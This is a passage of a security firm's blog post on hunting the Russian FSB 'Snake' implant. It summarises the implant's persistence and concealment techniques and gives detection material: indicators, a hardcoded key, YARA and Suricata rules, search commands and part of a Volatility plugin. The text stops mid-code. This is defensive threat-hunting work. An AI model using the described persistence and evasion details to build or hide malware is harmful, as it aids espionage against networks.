&lt;h1&gt;Snake’s capabilities&lt;/h1&gt;&lt;p&gt;The implant dubbed ‘Snake’ has been attributed to Centre 16 of Russia’s state sponsored FSB. The tool has been collecting intelligence in over 50 countries for up to 20 years, targeting research facilities, government networks, financial services, communications organisations, and other Critical National Infrastructure (CNI) organisations, meaning these organisations should be particularly vigilant and take precautionary steps to protect their networks.&lt;/p&gt;
&lt;p&gt;Described by CISA as Centre 16’s “most sophisticated cyber espionage tool for long-term intelligence collection”, Snake typically targets and infects external facing infrastructure, with its ultimate aim to compromise domain controllers and administrator accounts, enabling attackers to gain widespread access and control within targeted networks.&lt;/p&gt;
&lt;p&gt;Snake achieves these aims though a combination of several advanced technical features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A decentralised model - While the majority of malicious implants listen to and report back to a central node (i.e C2 or Command and Control Server) as part of a centralised infrastructure, Snake leverages a “decentralised” Peer-to-peer (P2P) network, supported by active implants residing on infected systems. As no centralised node acts as C2, commands and their output can be sent, received or retrieved all within the P2P network as nodes communicate with each other to route traffic and store information.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Indistinguishable from legitimate traffic - FSB operators can ensure that all traffic to targeted machines follow the Snake custom HTTP protocol effectively blending with legitimate traffic when using a compromised HTTP server as part of the Snake P2P network.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Numerous containerised tools and techniques – The implant conceals a plethora of tools, including network sniffers and keyloggers that can enable further compromise of target networks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Operating as a Kernel Driver (rootkit capabilities / kernel driver) – The aforementioned concealed techniques and tools can subsequently infect machines in Kernel Land while simultaneously leveraging active and passive operational mechanisms to achieve its aims.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;High degree of persistence – To achieve persistence Snake generally registers a service called &amp;ldquo;WerFaultSvc&amp;rdquo; that executes Snake&amp;rsquo;s WerFault.exe located in &amp;ldquo;%windows%\WinSxS\&amp;rdquo;, which decrypts Snake&amp;rsquo;s components and loads them into memory.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The fact that Snake is state sponsored also adds additional resourcing capability, motivation, persistence and potential impact, making this a particularly potent threat given Russian efforts to influence political processes, conduct espionage, and disrupt critical infrastructure.&lt;/p&gt;
&lt;h1&gt;How to detect Snake&lt;/h1&gt;&lt;p&gt;There are numerous threat hunting techniques that can be deployed to detect Snake. However, depending on the type of infrastructure or response mechanisms your organisation has in place, certain techniques may prove more or less effective.&lt;/p&gt;
&lt;p&gt;Here are some points to consider when prioritising how to detect Snake:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Host-Based Detection&lt;/strong&gt; - this type of detection is critical and should be performed regardless of the size of your enterprise. It is a high confidence set of rules, which are key to determining if any of Snake’s components are located on machines connected to the network.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Network based detection&lt;/strong&gt; – these type of detection rules could be particularly useful for large scale identification of Snake communication protocols. Ideal for enterprises using intrusion detection systems or firewalls that support Suricata rules deployment.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Memory Analysis&lt;/strong&gt; – Another technique to identify Snake is to investigate memory and see if it is executing at known locations. The CSA provides a useful Volatility plugin to perform this analysis. Unfortunately, this is less scalable and more time consuming, however, security researchers are developing alternatives that can help automating the process at larger scale.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Other Detection Mechanisms and Sigma Rules&lt;/strong&gt; – Sigma rules and Yara rules are being constantly developed as we write and will help speed up and automate the process of hunting for the FSB’s malware. These can often be integrated in SOC/SIEM as well as IR tooling.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Purple Team and Atomic Test Cases&lt;/strong&gt; – A highly efficient way of identifying and covering the detection gaps in your estate is to utilise a purple team approach, leveraging Atomic Red Team test cases which are being developed specifically for this implant.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;JUMPSEC have detailed a number of implementable threat hunting detections which at risk organisations may wish to implement here at JUMPSEC Labs. We recommend using a combination of these approaches to effectively mitigate the threat and remove any reliance on a single point of failure.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JUMPSEC have not exhaustively detailed each known technique. Additional hunting tools and techniques&lt;/strong&gt; &lt;strong&gt;may continue to be developed and JUMPSEC is actively monitoring NCSC and CISA detections to identify&lt;/strong&gt; &lt;strong&gt;opportunities where IoCs or TTPs can be leveraged.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Host-Based Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;host-based-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#host-based-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;While effective, host-based detections are not without shortcomings within certain environments.&lt;/p&gt;
&lt;p&gt;Host-based detections enable a high degree of confidence based on the totality of positive hits for host-based artifacts, however, many artifacts on the host are easily shifted to exist in a different location, or with a different name, as the files are fully encrypted and accurately identifying these files is difficult.&lt;/p&gt;
&lt;p&gt;To combat these limitations JUMPSEC advises that host-based detection is integration with further manual analysis of positive hits.&lt;/p&gt;
&lt;p&gt;Multiple Snake components can be detected running in the system using different Indicators of Compromise. For example, the Covert Store generated by the implant, can present the following hardcoded encryption key (not always, depending on the malware operator):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;And the same key can be retrieved from the following Windows Registry path when stored:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SECURITY\Policy\Secrets\n&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Furthermore, the following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as observed:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;EB 52 90 4E 54 46 53 20&lt;/p&gt;
&lt;p&gt;EB 5B 90 4E 54 46 53 20&lt;/p&gt;
&lt;p&gt;EB 3C 90 4D 53 44 4F 53&lt;/p&gt;
&lt;p&gt;EB 00 00 00 00 00 00 00&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;By encrypting each possible initial filesystem byte sequence with CAST-128 using the key obtained from the registry and searching for a file with a size that is an even multiple of 220, it is possible to efficiently detect Snake covert stores.&lt;/p&gt;
&lt;p&gt;Another component is the &lt;strong&gt;Registry Blob&lt;/strong&gt; which might appear in the Windows registry when searching for a value of at least 0x1000 bytes in size and a High entropy value of at least 7.9. However, it can typically be found using the following information when its values are left as default:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; Unknown (RegBlob)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Registry Path:&lt;/strong&gt; HKLM\SOFTWARE\Classes\.wav\OpenWithProgId&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Characteristics:&lt;/strong&gt; High Entropy&lt;/p&gt;
&lt;p&gt;Additionally, Snake’s Queue File can be located leveraging a file-system search with a Regular Expression together with searching for High Entropy files using the Yara Rule listed further below. Typically the Queue File can be found with the following information:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Typical Name:&lt;/strong&gt; &amp;lt; RANDOM_GUID &amp;gt;.&amp;lt;RANDOM_GUID&amp;gt;.crmlog&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Typical Path:&lt;/strong&gt; %windows\registration\&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; High Entropy, file attributes of hidden, system, and archive&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Snake Queue File&lt;/p&gt;
&lt;p&gt;The following Yara rule (named 1.yar) can be used in conjunction with the subsequently listed UNIX and PowerShell commands to detect instances of the Snake Queue FIle:&lt;/p&gt;
&lt;p&gt;1.yar&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;rule HighEntropy
{
    meta:
        description = &amp;#34;entropy rule&amp;#34;

    condition:
        math.entropy(0, filesize) &amp;gt;= 7.0
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;UNIX command:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;find /PATH/TO/WINDOWS_DIR -type f -regextype posix-egrep -iregex \
    &amp;#39;.*\/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog&amp;#39; \
     -exec yara 1.yar {} \;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;PowerShell command:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {
  $_.FullName -match
  &amp;#39;(?i)/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog$&amp;#39;
} | ForEach-Object {
  yara 1.yar $_.FullName
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Moreover, we can use the Yara rules with the last two components that might indicate the malware running on the host machine: comadmin and werfault.&lt;/p&gt;
&lt;p&gt;Comadmin can be detected using the following information and the previously mentioned Yara rule (1.yar):&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; comadmin.dat&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path:&lt;/strong&gt; %windows%\system32\Com&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; High Entropy&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Houses Snake’s kernel driver and the driver’s loader&lt;/p&gt;
&lt;p&gt;Leveraging the previously stated Yara rule (1.yar) we can use the following UNI or PowerShell commands:&lt;/p&gt;
&lt;p&gt;UNIX&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;find /PATH/TO/WINDOWS -type f -regextype posix-egrep -iregex \
    &amp;#39;.*\/system32/Com/comadmin\.dat&amp;#39; \
     -exec yara 1.yar {} \;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;PowerShell&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {
    $_.FullName -match &amp;#39;(?i)/system32/Com/comadmin\.dat$&amp;#39;
} | ForEach-Object {
    yara 1.yar $_.FullName
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;On the other end, the Werfault executable can be retrieved due to its use of non-standard icon-size and by using the information and the Yara rule stated below:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; Werfault.exe&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path:&lt;/strong&gt; %windows%\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; Icon is different than that of a valid Windows Werfault.exe file&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Persistence mechanism&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;rule PeIconSizes
{
    meta:
        description = &amp;#34;werfault rule&amp;#34;

    condition:
        pe.is_pe 
        and 
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 3240)
        and
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 1384)
        and
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 7336)
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Several tools can be used for the above-mentioned rules. Often SOC/SIEM platforms offer capabilities to automate this process once a blueprint of the hunt has been developed and integrated.&lt;/p&gt;
&lt;p&gt;If you currently don&amp;rsquo;t have any detection and response tooling, we recommend deploying one of the excellent open-source tools available online (we regularly use &lt;a href=&#34;https://github.com/Velocidex/velociraptor&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Velociraptor&lt;/a&gt;) to perform a hunt in your estate can integrate well with host-based hunting, allowing you to identify and respond to threats in conjunction with the techniques and rules mentioned above.&lt;/p&gt;
&lt;h2&gt;Network-based Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;network-based-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#network-based-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Network-based detection enables high-confidence for large-scale (network-wide) detection of custom Snake communication protocols. However, there is low visibility of Snake implant operations and encrypted data in transit.  Snake http, http2, and tcp signatures also potentially produce false positives and Snake operators can easily change network-based signatures.&lt;/p&gt;
&lt;p&gt;To counteract this, JUMPSEC recommend implementing Suricata rules to your NIDS appliances the following rules will enable you to detect http, http2 and tcp communication as leveraged by the implant. Further details can also be found within the &lt;a href=&#34;https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;advisory&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Snake http rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-http-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-http-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following RegEx can be used to build rules matching the http and http2 traffic contained within the HTTP header field.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;^[0-9A-Za-z]{10}[0-9A-Za-z/\&amp;#43;]{11}=&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Which can be used in a Suricata rule as follows:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;alert http any any -&amp;gt; any any (msg: &amp;#34;http rule (Cookie)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{10}[0-9A-Za-z\/\&amp;#43;]{11}=/C&amp;#34;;\
    flow: established, to_server;\
    sid: 7; rev: 1;)
alert http any any -&amp;gt; any any (msg: &amp;#34;http rule (Other Header)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{10}[0-9A-Za-z\/\&amp;#43;]{11}=/H&amp;#34;;\
    flow: established, to_server;\
    sid: 8; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Snake http2 rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-http2-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-http2-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;For http2, the implant’s header is encoded using base62 with non-extraneous characters. The following RegEx should be able to identify matches of such a header:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;      ^[0-9A-Za-z]{22}[0-9A-Za-z/;_=]{11}
alert http any any -&amp;gt; any any (msg: &amp;#34;http2 rule (Cookie)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/C&amp;#34;;\
    flow: established, to_server;\
    sid: 9; rev: 1;)
alert http any any -&amp;gt; any any (msg: &amp;#34;http2 rule (Other Header)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/H&amp;#34;;\
    flow: established, to_server;\
    sid: 10; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Snake tcp rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-tcp-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-tcp-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following rule helps capture the signature set during the client-to-server communication for tcp, which usually starts with “ustart”, as well as subsequent data flows that match the malware’s behaviour.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 08|&amp;#34;; startswith; dsize: 12;\
    flow: established, to_server; flowbits: set, a8; flowbits: noalert;\
    sid: 1; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 04|&amp;#34;; startswith; dsize:8;\
    flow: established, to_server; flowbits: isset, a8; flowbits: unset, a8;\
    flowbits: set, a4; flowbits: noalert;\
    sid: 2; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 08|&amp;#34;; startswith; dsize: 4;\
    flow: established, to_client; flowbits: isset, a4; flowbits: unset, a4;\
    flowbits: set, b81; flowbits: noalert;\
    sid: 3; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    dsize: 8; flow: established, to_client; flowbits: isset, b81;\
    flowbits: unset, b81; flowbits: set, b8; flowbits: noalert;\
    sid: 4; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 04|&amp;#34;; startswith; dsize: 4;\
    flow: established, to_client; flowbits: isset, b8; flowbits: unset, b8;\
    flowbits: set, b41; flowbits: noalert;\
    sid: 5; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    dsize: 4; flow: established, to_client; flowbits: isset, b41;\
    flowbits: unset, b41;\
    sid: 6; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;Memory Analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;memory-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#memory-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Memory analysis also enables a high degree of detection confidence as memory provides the greatest level of visibility into Snake’s behaviour and artifacts. However, it has the potential to impact system stability, is difficult to scale, and can be a time-consuming process.&lt;/p&gt;
&lt;p&gt;The joint advisory suggests the following as the most effective approach to detect the implant on an infected host and it provides a script to be used alongside Volatility and a memory dump of the target infected machine.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# This plugin to identify the injected usermode component of Snake is based 
# on the malfind plugin released with Volatility3
#
# This file is Copyright 2019 Volatility Foundation and licensed under the 
# Volatility Software License 1.0
# which is available at https://www.volatilityfoundation.org/license/vsl-v1.0
import logging
from typing import Iterable, Tuple
from volatility3.framework import interfaces, symbols, exceptions, renderers
from volatility3.framework.configuration import requirements
from volatility3.framework.objects import utility
from volatility3.framework.renderers import format_hints
from volatility3.plugins.windows import pslist, vadinfo
vollog = logging.getLogger(__name__)
class snake(interfaces.plugins.PluginInterface):
    _required_framework_version = (2, 4, 0)
    
    @classmethod
    def get_requirements(cls):
        return [
            requirements.ModuleRequirement(name = &amp;#39;kernel&amp;#39;, 
            description = &amp;#39;Windows kernel&amp;#39;, 
            architectures = [&amp;#34;Intel32&amp;#34;, &amp;#34;Intel64&amp;#34;]),
            requirements.VersionRequirement(name = &amp;#39;pslist&amp;#39;, 
            component = pslist.PsList, version = (2, 0, 0)),
            requirements.VersionRequirement(name = &amp;#39;vadinfo&amp;#39;, 
            component = vadinfo.VadInfo, version = (2, 0, 0))]

    @classmethod
    def list_injections(
            cls, context: interfaces.context.ContextInterface, 
            kernel_layer_name: str, symbol_table: str,
            proc: interfaces.objects.ObjectInterface) -&amp;gt; Iterable[
            Tuple[interfaces.objects.ObjectInterface, bytes]]:
        proc_id = &amp;#34;Unknown&amp;#34;
        try:
            proc_id = proc.UniqueProcessId
            proc_layer_name = proc.add_process_layer()
        except exceptions.InvalidAddressException as excp:
            vollog.debug(&amp;#34;Process {}: invalid address {} in layer {}&amp;#34;.
            format(proc_id, excp.invalid_address, excp.layer_name))
            return
        proc_layer = context.layers[proc_layer_name]
        for vad in proc.get_vad_root().traverse():
            protection_string = vad.get_protection(vadinfo.VadInfo.
            protect_values(context, kernel_layer_name, symbol_table), 
            vadinfo.winnt_protections)
            if not &amp;#34;PAGE_EXECUTE_READWRITE&amp;#34; in protection_string:
                continue

            if (vad.get_private_memory() == 1
                    and vad.get_tag() == &amp;#34;VadS&amp;#34;) or (vad.get_private_memory() 
                    == 0 and protection_string != 
                    &amp;#34;PAGE_EXECUTE_WRITECOPY&amp;#34;):
                data = proc_layer.read(vad.get_start(), 
                vad.get_size(), pad = True)
                if data.find(b&amp;#39;\x4d\x5a&amp;#39;) != 0:
                    continue
                yield vad, data

    def _generator(self, procs):
        kernel = self.context.modules[self.config[&amp;#39;kernel&amp;#39;]]
        is_32bit_arch = not symbols.symbol_table_is_64bit(self.context, 
        kernel.symbol_table_name)
